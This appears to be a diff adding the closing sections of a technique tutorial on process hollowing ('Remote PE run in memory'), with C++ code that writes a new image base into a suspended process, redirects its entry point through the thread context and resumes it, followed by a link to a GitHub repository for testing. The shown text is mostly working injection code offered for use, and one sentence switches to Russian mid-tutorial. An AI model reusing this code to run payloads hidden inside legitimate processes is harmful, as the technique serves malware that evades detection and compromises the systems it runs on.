@@ -388,3 +388,50 @@ Here is the loop that will write our sections to our PE file
 	}
 ```
 
+### Set Entry Pointer 
+
+Write our ImageBase address
+```cpp
+    if (!WriteProcessMemory(pi.hProcess,(LPVOID)(ctx->Rdx + sizeof(LPVOID) * 2),&lpImageBase,sizeof(LPVOID),NULL)){
+        DWORD error = GetLastError();
+        printf("[!] WriteProcessMemory end with error %lu\n", error);
+
+        TerminateProcess(pi.hProcess,-8);
+        return;
+    }
+```
+
+And then specifies our entry point
+```cpp
+    ctx->Rcx = (DWORD64)(lpImageBase) + pNtHdr->OptionalHeader.AddressOfEntryPoint;
+```
+
+### EXECUTE!!!
+
+Теперь просто стоит указать наш конекст и вернуть поток 
+```cpp
+    // Set the context
+    if (!SetThreadContext(pi.hThread,ctx))
+    {
+        DWORD error = GetLastError();
+        printf("[!] SetThreadContext end with error %lu\n", error);
+
+        TerminateProcess(pi.hProcess,-9);
+        return;
+    }
+    // ´Start the process
+    if (!ResumeThread(pi.hThread))
+    {
+        DWORD error = GetLastError();
+        printf("[!] ResumeThread end with error %lu\n", error);
+
+        TerminateProcess(pi.hProcess,-10);
+        return;
+    }
+```
+
+
+## Resume 
+
+Now I have told you in brief how Remote PE run in memory works. 
+If you have any comments, you can write to me in Telegram. Here is a link to github for testing https://github.com/ymmfty0/RemoteFileExecute/.
